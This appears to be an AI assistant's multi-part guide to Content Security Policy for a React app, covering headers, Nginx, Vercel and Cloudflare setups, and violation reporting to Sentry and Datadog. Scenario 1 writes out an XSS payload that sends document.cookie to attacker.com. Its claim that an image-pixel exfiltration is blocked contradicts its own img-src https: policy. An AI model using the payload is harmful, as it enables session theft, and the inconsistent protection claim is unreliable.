Below is a production-ready **Content Security Policy (CSP)** configuration tailored for a modern React Single Page Application (SPA) deployed via reverse proxies (like Nginx), cloud hostings (Cloudflare, Vercel, AWS CloudFront), or server headers.

---

## Production-Ready CSP Header String

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https:; font-src 'self' data: https:; connect-src 'self' https: wss:; media-src 'self' https:; object-src 'none'; frame-src 'none'; child-src 'none'; frame-ancestors 'none'; worker-src 'self' blob:; manifest-src 'self'; base-uri 'self'; form-action 'self'; upgrade-insecure-requests; block-all-mixed-content;

```

---

## Detailed Breakdown of Directives

| Directive                       | Configured Value            | Security & Architectural Rationale                                                                                                                                                                |
| ------------------------------- | --------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **`default-src`**               | `'self'`                    | Secure baseline. Restricts all unmentioned fetch types to the app's own origin.                                                                                                                   |
| **`script-src`**                | `'self' 'wasm-unsafe-eval'` | Executes scripts strictly from your domain. Blocks inline scripts (`<script>alert(1)</script>`) and string evaluation (`eval()`). `'wasm-unsafe-eval'` enables WebAssembly compilation if needed. |
| **`style-src`**                 | `'self' 'unsafe-inline'`    | Allows stylesheets hosted on your domain. `'unsafe-inline'` is commonly required for CSS-in-JS libraries (e.g., Styled Components, Emotion, Tailwind dynamic classes).                            |
| **`img-src`**                   | `'self' data: blob: https:` | Allows local images, inline Base64 data URIs, dynamic image blobs, and external HTTPS image sources/CDNs.                                                                                         |
| **`font-src`**                  | `'self' data: https:`       | Supports locally hosted fonts, base64 fonts, and external font hosts (e.g., Google Fonts, Typekit).                                                                                               |
| **`connect-src`**               | `'self' https: wss:`        | Controls destinations for `fetch()`, `XHR`, WebSockets (`wss:`), and analytics beacons. Restricts outbound telemetry and API calls.                                                               |
| **`media-src`**                 | `'self' https:`             | Restricts audio/video loading to local files or secure external media sources.                                                                                                                    |
| **`object-src`**                | `'none'`                    | Completely disables legacy browser plugins (`<object>`, `<embed>`, `<applet>`). Highly effective against Flash/Java vulnerabilities.                                                              |
| **`frame-src`**                 | `'none'`                    | Prevents your SPA from embedding third-party `<iframe>` content. *(Change to specific domains if using Stripe Elements or YouTube embeds).*                                                       |
| **`child-src`**                 | `'none'`                    | Prevents creation of legacy nested browsing contexts or web workers from unapproved sources.                                                                                                      |
| **`frame-ancestors`**           | `'none'`                    | **Clickjacking prevention.** Prevents any external domain from rendering your application inside an `<iframe>`.                                                                                   |
| **`worker-src`**                | `'self' blob:`              | Allows Web Workers and Service Workers (PWA capabilities) loaded from your origin or dynamically instantiated blobs.                                                                              |
| **`manifest-src`**              | `'self'`                    | Restricts Web App Manifest downloads (`manifest.json`) to your origin.                                                                                                                            |
| **`base-uri`**                  | `'self'`                    | Prevents attackers from injecting a `<base>` tag to hijack relative URL resolution.                                                                                                               |
| **`form-action`**               | `'self'`                    | Restricts form submission targets to your own origin.                                                                                                                                             |
| **`upgrade-insecure-requests`** | *(Flag)*                    | Instructs the browser to automatically upgrade any legacy HTTP asset links to HTTPS before fetching.                                                                                              |
| **`block-all-mixed-content`**   | *(Flag)*                    | Hard failure if any HTTP resource tries to load over an HTTPS connection.                                                                                                                         |

---

## Deployment Code Snippets

### 1. Nginx Configuration

```nginx
server {
    listen 443 ssl http2;
    server_name app.yourdomain.com;

    add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https:; font-src 'self' data: https:; connect-src 'self' https: wss:; media-src 'self' https:; object-src 'none'; frame-src 'none'; child-src 'none'; frame-ancestors 'none'; worker-src 'self' blob:; manifest-src 'self'; base-uri 'self'; form-action 'self'; upgrade-insecure-requests;" always;
}

```

### 2. Vercel (`vercel.json`)

```json
{
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        {
          "key": "Content-Security-Policy",
          "value": "default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https:; font-src 'self' data: https:; connect-src 'self' https: wss:; media-src 'self' https:; object-src 'none'; frame-src 'none'; child-src 'none'; frame-ancestors 'none'; worker-src 'self' blob:; manifest-src 'self'; base-uri 'self'; form-action 'self'; upgrade-insecure-requests;"
        }
      ]
    }
  ]
}

```

### 3. HTML Meta Tag (Fallback Option)

If you cannot set server headers (e.g., static S3 hosting without CloudFront functions), you can place this in your `public/index.html`.

*> **Note:** `frame-ancestors` and `report-uri` are **not supported** in HTML meta tags and must be set via real HTTP headers.*

```html
<meta 
  http-equiv="Content-Security-Policy" 
  content="default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https:; font-src 'self' data: https:; connect-src 'self' https: wss:; media-src 'self' https:; object-src 'none'; frame-src 'none'; child-src 'none'; worker-src 'self' blob:; manifest-src 'self'; base-uri 'self'; form-action 'self';" 
/>

```

---

## Strict Nonce-Based Alternative (Advanced)

If you require **strict CSP** without allowing inline scripts or styles, implement a **Nonce** (number used once). This requires an SSR server or edge middleware (like Next.js or Cloudflare Workers) to generate a unique random string on every HTTP request:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-rAnd0m123456'; style-src 'self' 'nonce-rAnd0m123456';

```

In your React template, apply that nonce to injected scripts:

```html
<script nonce="rAnd0m123456" src="/static/js/main.js"></script>

```

---

## Testing & Monitoring Violations

Before enforcing CSP in production, deploy it in **Report-Only Mode** to detect broken integrations without crashing user sessions:

```http
Content-Security-Policy-Report-Only: default-src 'self'; ... ; report-uri https://your-logging-endpoint.com/csp-reports;

```

Once you verify zero legitimate violations are logged, swap the header name to `Content-Security-Policy`.

Here are two practical production scenarios demonstrating how the CSP header responds when under attack versus when integrating legitimate third-party services.

---

### Scenario 1: Preventing a Malicious Cross-Site Scripting (XSS) Attack

#### The Attack

A user pastes a malicious link into your React app that extracts a comment parameter from the URL query string and dynamically renders it. An attacker crafts a payload designed to steal session data:

```html
https://app.yourdomain.com/comments?q=<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>

```

Even if your application accidentally uses an insecure method to insert this script tag into the DOM, the browser executes the following evaluation against your CSP:

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; connect-src 'self'; ...

```

#### What Happens Step-by-Step

1. **Inline Script Execution Blocked:**
The browser checks the `<script>` tag against `script-src 'self'`. Because the inline script does not match `'self'` and lacks a valid `nonce` or `hash`, the browser refuses to execute it.
2. **Network Exfiltration Blocked:**
Even if the attacker disguised the payload as an image pixel (`<img src="[https://attacker.com/steal](https://attacker.com/steal)...">`), the browser checks `connect-src 'self'` or `img-src 'self'` and aborts the outbound HTTP request.
3. **Browser Console Output:**

```text
Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'self'". Either the 'unsafe-inline' keyword, a hash ('sha256-...'), or a nonce ('nonce-...') is required to enable inline execution.

```

1. **Outcome:** The attack fails completely. No user cookies or session tokens are leaked.

---

### Scenario 2: Safely Integrating Third-Party Services (e.g., Stripe & Google Fonts)

#### The Challenge

By default, the strict CSP (`default-src 'self'`) will **block** legitimate integrations like Stripe payment processing or Google Fonts because they attempt to load external scripts, frames, and stylesheets.

#### The Error (Unmodified CSP)

When loading Stripe Elements or Google Fonts under `default-src 'self'`, the browser throws console errors:

```text
Refused to load the script 'https://js.stripe.com/v3/' because it violates the CSP directive: "script-src 'self'".
Refused to load the style 'https://fonts.googleapis.com/css2' because it violates the CSP directive: "style-src 'self'".

```

#### The Solution: Target Directive Updates

Instead of relaxing the whole policy to `*`, you explicitly allow only the necessary external origins for each resource type:

```http
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' https://js.stripe.com;
  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
  font-src 'self' data: https://fonts.gstatic.com;
  frame-src https://js.stripe.com;
  connect-src 'self' https://api.stripe.com;

```

#### How the Browser Evaluates the Integration

* **`script-src [https://js.stripe.com](https://js.stripe.com)`**: Allows your app to load the official Stripe JavaScript SDK (`<script src="[https://js.stripe.com/v3/](https://js.stripe.com/v3/)"></script>`).
* **`frame-src [https://js.stripe.com](https://js.stripe.com)`**: Allows Stripe to embed secure credit card entry iframes inside your checkout page.
* **`connect-src [https://api.stripe.com](https://api.stripe.com)`**: Permits payment validation network requests made directly from the client to Stripe's payment APIs.
* **`font-src [https://fonts.gstatic.com](https://fonts.gstatic.com)`**: Authorizes font binary downloads served from Google's static servers.

Show how to configure CSP violation reporting with a custom endpoint and handle report payloads.

Configuring CSP violation reporting allows your browser to automatically post a JSON report whenever a security policy rule is violated. This gives you real-time visibility into active XSS attempts, broken third-party scripts, or outdated policy rules.

---

## 1. Setting Up the CSP Reporting Headers

Modern browsers support two ways to specify a reporting endpoint:

1. **`Reporting-Endpoints` Header + `report-to` Directive:** The modern W3C standard.
2. **`report-uri` Directive:** The legacy directive supported by all older browsers.

For full cross-browser compatibility, define **both** in your server response headers:

```http
Reporting-Endpoints: csp-endpoint="https://api.yourdomain.com/v1/csp-violations"
Content-Security-Policy: default-src 'self'; script-src 'self'; report-to csp-endpoint; report-uri /v1/csp-violations;

```

> **Testing Tip:** If you want to log violations **without** blocking any scripts or styles while testing, use `Content-Security-Policy-Report-Only` instead of `Content-Security-Policy`.

---

## 2. Sample Report Payloads Sent by Browsers

Browsers send reports via `POST` requests. Depending on whether the browser uses the modern Reporting API or the legacy `report-uri` specification, the JSON payload structure differs slightly.

### Modern Browser Payload (`report-to` / `application/reports+json`)

Modern browsers send an array of objects with the `Content-Type: application/reports+json` header:

```json
[
  {
    "age": 10,
    "type": "csp-violation",
    "url": "https://app.yourdomain.com/dashboard",
    "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...",
    "body": {
      "blockedURL": "https://malicious-domain.com/evil.js",
      "disposition": "enforce",
      "documentURL": "https://app.yourdomain.com/dashboard",
      "effectiveDirective": "script-src-elem",
      "originalPolicy": "default-src 'self'; script-src 'self'; report-to csp-endpoint;",
      "referrer": "https://app.yourdomain.com/",
      "sample": "",
      "statusCode": 200
    }
  }
]

```

### Legacy Payload (`report-uri` / `application/csp-report`)

Legacy requests use the `Content-Type: application/csp-report` header with a root `"csp-report"` wrapper:

```json
{
  "csp-report": {
    "document-uri": "https://app.yourdomain.com/dashboard",
    "referrer": "https://app.yourdomain.com/",
    "blocked-uri": "https://malicious-domain.com/evil.js",
    "effective-directive": "script-src-elem",
    "violated-directive": "script-src 'self'",
    "original-policy": "default-src 'self'; script-src 'self'; report-uri /v1/csp-violations;"
  }
}

```

---

## 3. Custom Backend Violation Handler (Node.js / Express)

Here is a production-grade Express.js endpoint handler that accepts both payload formats, normalizes them, and routes logs to your monitoring service (e.g., Datadog, Sentry, Winston):

```javascript
import express from 'express';

const app = express();

// Parse both raw standard JSON and CSP specific MIME types
app.use(express.json({ 
  type: ['application/json', 'application/csp-report', 'application/reports+json'] 
}));

app.post('/v1/csp-violations', (req, res) => {
  try {
    const payload = req.body;
    let violations = [];

    // 1. Handle Modern Reporting API format (Array)
    if (Array.isArray(payload)) {
      violations = payload
        .filter(report => report.type === 'csp-violation')
        .map(report => ({
          documentUri: report.body.documentURL,
          blockedUri: report.body.blockedURL,
          effectiveDirective: report.body.effectiveDirective,
          originalPolicy: report.body.originalPolicy,
          userAgent: report.user_agent,
          source: 'reporting-api'
        }));
    } 
    // 2. Handle Legacy report-uri format (Wrapped Object)
    else if (payload && payload['csp-report']) {
      const report = payload['csp-report'];
      violations.push({
        documentUri: report['document-uri'],
        blockedUri: report['blocked-uri'],
        effectiveDirective: report['effective-directive'] || report['violated-directive'],
        originalPolicy: report['original-policy'],
        userAgent: req.headers['user-agent'],
        source: 'legacy-report-uri'
      });
    }

    // 3. Process and log the normalized violations
    violations.forEach(violation => {
      // Filter out browser extension noise (e.g., chrome-extension://)
      if (violation.blockedUri && violation.blockedUri.startsWith('chrome-extension://')) {
        return; 
      }

      console.warn('[CSP VIOLATION DETECTED]', {
        timestamp: new Date().toISOString(),
        documentUri: violation.documentUri,
        blockedUri: violation.blockedUri,
        effectiveDirective: violation.effectiveDirective,
        source: violation.source
      });

      // Example: Forward to Sentry, Datadog, or custom database
      // analyticsService.logSecurityEvent('csp_violation', violation);
    });

    // CSP endpoints expect an empty HTTP 204 No Content response
    res.status(204).end();

  } catch (error) {
    console.error('Failed to parse CSP report:', error);
    res.status(400).send('Invalid CSP Report Payload');
  }
});

app.listen(3000, () => console.log('CSP Reporting server running on port 3000'));

```

---

## 4. Production Considerations & Noise Filtering

* **HTTP 204 Responses:** Always return an HTTP `204 No Content` status from your logging endpoint. The browser doesn't expect a response body.
* **Filter Browser Extension Noise:** Chrome extensions often inject scripts into web pages that trigger CSP reports (e.g., `chrome-extension://...`). Ignore these in your logger to avoid alert fatigue.
* **Rate Limiting:** Popular sites receive high volumes of report spikes during attacks. Apply rate-limiting middleware (e.g., `express-rate-limit`) on your report endpoint to prevent Denial of Service (DoS) on your logging infrastructure.

Show how to route CSP violation logs to Sentry or Datadog using Node.js.

Here is how to route and format CSP violation logs directly to **Sentry** and **Datadog** within a Node.js / Express backend.

---

## 1. Routing CSP Violations to Sentry

Sentry has built-in support for security events. Using `@sentry/node`, you can either ingest raw browser CSP payloads using Sentry's dedicated **Security Header Endpoint**, or capture structured events via the standard SDK.

### Option A: Direct SDK Capture (Recommended for Node middleware)

Parse and log normalized CSP events using `Sentry.captureMessage` or `Sentry.captureException`:

```javascript
import express from 'express';
import * as Sentry from '@sentry/node';

// Initialize Sentry SDK
Sentry.init({
  dsn: 'https://YOUR_PUBLIC_KEY@o0.ingest.sentry.io/YOUR_PROJECT_ID',
  environment: process.env.NODE_ENV || 'production',
});

const app = express();

app.use(express.json({ 
  type: ['application/json', 'application/csp-report', 'application/reports+json'] 
}));

app.post('/v1/csp-violations/sentry', (req, res) => {
  const payload = req.body;
  const reports = extractCspReports(payload);

  reports.forEach((report) => {
    // Ignore browser extension noise
    if (report.blockedUri?.startsWith('chrome-extension://')) return;

    Sentry.withScope((scope) => {
      scope.setTag('csp.directive', report.effectiveDirective);
      scope.setTag('csp.disposition', report.disposition || 'enforce');
      scope.setExtra('document_uri', report.documentUri);
      scope.setExtra('blocked_uri', report.blockedUri);
      scope.setExtra('original_policy', report.originalPolicy);
      scope.setFingerprint(['csp-violation', report.effectiveDirective, report.blockedUri]);

      Sentry.captureMessage(
        `CSP Violation: ${report.blockedUri} blocked by ${report.effectiveDirective}`,
        'warning'
      );
    });
  });

  res.status(204).end();
});

// Helper function to normalize both Reporting API and legacy payloads
function extractCspReports(payload) {
  if (Array.isArray(payload)) {
    return payload
      .filter((r) => r.type === 'csp-violation')
      .map((r) => ({
        documentUri: r.body.documentURL,
        blockedUri: r.body.blockedURL,
        effectiveDirective: r.body.effectiveDirective,
        disposition: r.body.disposition,
        originalPolicy: r.body.originalPolicy,
      }));
  }
  if (payload && payload['csp-report']) {
    const r = payload['csp-report'];
    return [{
      documentUri: r['document-uri'],
      blockedUri: r['blocked-uri'],
      effectiveDirective: r['effective-directive'] || r['violated-directive'],
      disposition: 'enforce',
      originalPolicy: r['original-policy'],
    }];
  }
  return [];
}

```

### Option B: Native Sentry CSP Report Endpoint (No Node code required)

Sentry provides a zero-code endpoint URL directly in your Sentry project settings (**Settings -> Security Headers**). You can put this DSN directly into your CSP header:

```http
Content-Security-Policy: default-src 'self'; report-uri https://o0.ingest.sentry.io/api/YOUR_PROJECT_ID/security/?sentry_key=YOUR_PUBLIC_KEY;

```

---

## 2. Routing CSP Violations to Datadog

Datadog ingests CSP violations as structured logs using the `@datadog/browser-logs` SDK on the client side, or via Datadog's HTTP Logs API (`datadog-winston` / `dd-trace`) on your backend server.

### Node.js Backend Ingestion using Datadog Logs API (`@datadog/datadog-api-client`)

```javascript
import express from 'express';
import { client, v2 } from '@datadog/datadog-api-client';

const app = express();

app.use(express.json({ 
  type: ['application/json', 'application/csp-report', 'application/reports+json'] 
}));

// Configure Datadog API Client
const configuration = client.createConfiguration({
  authMethods: {
    apiKeyAuth: process.env.DD_API_KEY,
  },
});
// Set region (e.g., datadoghq.com or datadoghq.eu)
configuration.setCurrentHttpProxy('');
const logsApi = new v2.LogsApi(configuration);

app.post('/v1/csp-violations/datadog', async (req, res) => {
  const payload = req.body;
  const reports = extractCspReports(payload); // Reuses normalization helper above

  const logEntries = reports
    .filter((r) => !r.blockedUri?.startsWith('chrome-extension://'))
    .map((report) => ({
      ddsource: 'csp-reporter',
      ddtags: `env:${process.env.NODE_ENV || 'production'},service:frontend-security`,
      hostname: req.hostname,
      message: `CSP violation blocked ${report.blockedUri}`,
      status: 'warn',
      csp: {
        document_uri: report.documentUri,
        blocked_uri: report.blockedUri,
        effective_directive: report.effectiveDirective,
        original_policy: report.originalPolicy,
        user_agent: req.headers['user-agent'],
      },
    }));

  if (logEntries.length > 0) {
    try {
      await logsApi.submitLog({ body: logEntries });
    } catch (error) {
      console.error('Failed to ship CSP log to Datadog:', error);
    }
  }

  res.status(204).end();
});

```

---

## Metric & Alert Setup Guidelines

1. **Datadog Security Monitoring (CSM):** Map the `csp.blocked_uri` field to a facet in Datadog Log Management. Create a log-based monitor alerting if `status:warn service:frontend-security` exceeds **> 50 events in 5 minutes**.
2. **Sentry Issue Grouping:** Using custom fingerprinting (`scope.setFingerprint`) ensures that 1,000 users hitting the same XSS payload group into **1 single Sentry issue** rather than flooding your notification channels.

CSP violation handling **must be split across both the Backend and Frontend / Infrastructure**, with each playing a distinct, non-overlapping role.

Here is the exact architectural breakdown of **where** each piece belongs and **how** to implement it:

---

## 1. Backend Role (Ingestion & Processing)

The backend is responsible for **receiving, parsing, filtering, and shipping** the violation payloads sent by browsers.

### Where

* **Dedicated API Endpoint:** Create a route like `POST /v1/csp-violations`.
* **Logging Pipeline / Ingestion Worker:** Send parsed logs asynchronously to Sentry, Datadog, or Elasticsearch so the API stays lightweight.

### How

1. **Accept Multiple Payload Types:** Browsers send two types of payloads depending on age: `application/reports+json` (modern) or `application/csp-report` (legacy).
2. **Filter Out Noise:** Ignore extensions (`chrome-extension://`) and local development URIs before sending logs to your monitoring tools.
3. **Return HTTP 204:** Always immediately send `204 No Content` to the browser without a response body.

```javascript
// Express.js Example
app.post('/v1/csp-violations', express.json({ type: ['*/json', 'application/csp-report'] }), (req, res) => {
  // Extract and normalize payload
  const violation = normalizeCspReport(req.body);
  
  // Ignore browser extension false positives
  if (!violation.blockedUri?.startsWith('chrome-extension://')) {
    sentryClient.captureMessage(`CSP Triggered: ${violation.blockedUri}`, { extra: violation });
  }

  res.status(204).end(); // Immediate non-blocking response
});

```

---

## 2. Frontend & Infrastructure Role (Policy Definition)

The frontend application code does **not** catch or process CSP violations. Instead, the **server hosting the frontend** (or CDN/reverse proxy) defines the security rules that the user's browser must enforce.

### Where

* **HTTP Response Headers:** Set on your web server (Nginx, Apache), reverse proxy (Cloudflare, AWS CloudFront), or SSR server (Next.js / Express).
* **HTML `<meta>` Tag (Fallback):** Used only if you lack access to HTTP server headers (e.g., pure static AWS S3 bucket).

### How

Define the rules using HTTP response headers so the browser enforces them **before** any code runs:

```http
Reporting-Endpoints: csp-endpoint="https://api.yourdomain.com/v1/csp-violations"
Content-Security-Policy: 
  default-src 'self'; 
  script-src 'self' https://trustedscripts.com; 
  report-to csp-endpoint; 
  report-uri https://api.yourdomain.com/v1/csp-violations;

```

---

## Summary Matrix

| Task                        | Location                    | Mechanism                                        |
| --------------------------- | --------------------------- | ------------------------------------------------ |
| **Defining Security Rules** | Infrastructure / Web Server | HTTP Response Header (`Content-Security-Policy`) |
| **Enforcing Rules**         | Client Browser              | Native Browser Engine                            |
| **Receiving Reports**       | Backend API                 | Endpoint handler accepting POST requests         |
| **Monitoring & Alerting**   | Backend / Third-party       | Datadog, Sentry, or ELK Stack                    |

Show how to configure CSP and reporting headers in Nginx and Cloudflare.

Configuring CSP and reporting headers at the infrastructure layer (Nginx or Cloudflare Edge) ensures that security policies are applied consistently to every HTML response, regardless of how your front-end framework handles routing.

---

## 1. Nginx Configuration

In Nginx, use the `add_header` directive inside your `server` or `location` block. Always include the `always` parameter so headers are sent regardless of the response status code (e.g., on `200`, `404`, or `500` errors).

### Complete `nginx.conf` Snippet

```nginx
server {
    listen 443 ssl http2;
    server_name app.yourdomain.com;

    # SSL Certificate Configuration
    ssl_certificate /etc/letsencrypt/live/app.yourdomain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/app.yourdomain.com/privkey.pem;

    # 1. Define Modern Reporting Endpoints (W3C Standard)
    add_header Reporting-Endpoints 'main-csp="https://api.yourdomain.com/v1/csp-violations"' always;

    # 2. Define Content-Security-Policy with modern and legacy reporting directives
    add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https:; font-src 'self' data: https:; connect-src 'self' https: wss:; media-src 'self' https:; object-src 'none'; frame-src 'none'; frame-ancestors 'none'; worker-src 'self' blob:; manifest-src 'self'; base-uri 'self'; form-action 'self'; upgrade-insecure-requests; report-to main-csp; report-uri https://api.yourdomain.com/v1/csp-violations;" always;

    # 3. Additional Security Hardening Headers
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;

    location / {
        root /usr/share/nginx/html;
        index index.html;
        try_files $uri $uri/ /index.html;
    }
}

```

> **Important Nginx Caveat:** `add_header` directives in Nginx are **not additive** across contexts. If you declare `add_header` in a child `location` block, it overrides *all* `add_header` directives from the parent `server` block. Ensure your headers are defined at the exact block level where requests are served.

---

## 2. Cloudflare Configuration

Cloudflare allows you to attach headers at the edge, modifying responses before they reach the user's browser without modifying origin server code.

### Option A: Via Cloudflare Dashboard (HTTP Response Header Rules)

1. Log into the **Cloudflare Dashboard** and select your domain.
2. Navigate to **Rules** $\rightarrow$ **Transform Rules** $\rightarrow$ **HTTP Response Header Modification**.
3. Click **Create rule**.
4. Set rule conditions:

* **Field:** *URI Path*
* **Operator:** *matches regex*
* **Value:** `.*` (or restrict to HTML paths like `^/(.*)$`).

1. Under **Set headers**, add the following modifications:

| Action         | Header Name               | Value                                                                                                                                                                                                |
| -------------- | ------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Set static** | `Reporting-Endpoints`     | `csp-endpoint="[https://api.yourdomain.com/v1/csp-violations](https://api.yourdomain.com/v1/csp-violations)"`                                                                                        |
| **Set static** | `Content-Security-Policy` | `default-src 'self'; script-src 'self'; connect-src 'self' https:; report-to csp-endpoint; report-uri [https://api.yourdomain.com/v1/csp-violations](https://api.yourdomain.com/v1/csp-violations);` |

---

### Option B: Via Cloudflare Workers (Programmatic Edge Injection)

If you need dynamic logic (e.g., generating nonces per request or checking environments), use a Cloudflare Worker:

```javascript
export default {
  async fetch(request, env, ctx) {
    // Fetch original response from origin server
    const response = await fetch(request);

    // Only apply CSP to HTML document requests
    const contentType = response.headers.get("content-type") || "";
    if (!contentType.includes("text/html")) {
      return response;
    }

    // Clone headers to make them mutable
    const newHeaders = new Headers(response.headers);

    // Modern Reporting API Endpoint Header
    newHeaders.set(
      "Reporting-Endpoints",
      'worker-csp="https://api.yourdomain.com/v1/csp-violations"'
    );

    // Enforced CSP Header
    const cspValue = [
      "default-src 'self'",
      "script-src 'self' 'wasm-unsafe-eval'",
      "style-src 'self' 'unsafe-inline'",
      "img-src 'self' data: blob: https:",
      "connect-src 'self' https: wss:",
      "frame-ancestors 'none'",
      "base-uri 'self'",
      "form-action 'self'",
      "report-to worker-csp",
      "report-uri https://api.yourdomain.com/v1/csp-violations"
    ].join("; ");

    newHeaders.set("Content-Security-Policy", cspValue);

    return new Response(response.body, {
      status: response.status,
      statusText: response.statusText,
      headers: newHeaders,
    });
  },
};

```

---

## Verification

After applying the configuration, verify that the headers are properly emitted using `curl`:

```bash
curl -I https://app.yourdomain.com

```

Look for the presence of both headers in the response output:

```http
HTTP/2 200
reporting-endpoints: csp-endpoint="https://api.yourdomain.com/v1/csp-violations"
content-security-policy: default-src 'self'; script-src 'self'; ... report-to csp-endpoint;

```
